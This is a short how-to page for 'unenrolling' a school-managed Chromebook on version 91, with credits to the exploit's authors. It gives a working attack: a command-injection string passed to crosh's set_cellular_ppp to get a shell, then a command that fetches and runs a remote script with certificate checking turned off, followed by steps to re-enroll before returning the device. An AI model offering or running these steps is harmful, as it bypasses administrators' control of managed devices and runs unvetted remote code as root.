**Uninrollment for Chromebook**

In order for this exploit to work you will need to downgrade to EXACTLY version 91. Downgrade instructions can be found here

This method requires crosh to be unblocked on your chromebook. Crosh can be opened with CTRL+ALT+T If it's blocked by an extension, you can disable it with LTBEEF v91 WILL NOT WORK ON GRUNT BOARDS OR ARM CHROMEBOOKS MAKE SURE YOU HAVE EXACTLY VERSION 91.0.4472.102, NOT VERSION 91.0.4472.167 STEPS: Open crosh (ctrl + alt + t) Type in **set_cellular_ppp ';bash;exit;'** and enter Type in **bash <(curl -k https://coolelectronics.me/unroll)** and enter Wait for the script to finish, then powerwash your chromebook

Steps to Re-Enroll when you turn your chromebook back in at the end of the year:

Enable Devmode (ESC+Power+Reload, ctrl d and enter on recovery screen) Once in chrome, Open crosh (ctrl + alt + t) Type in shell Type in sudo vpd -i RW_VPD -s check_enrollment=1 Powerwash again

Site made by CoolElectronics#4683 UNROLL (U Need Root LoL) acroynm by ULTRA BLUE#1850 and zuh#6098 justinchrm#3399 helped with testing Shroot™ name by phennen#9801 shroot80 script created by OlyB#9420 Kiosk Exploit found by Divide/B3AT Root exploits originally found by Rory McNamara
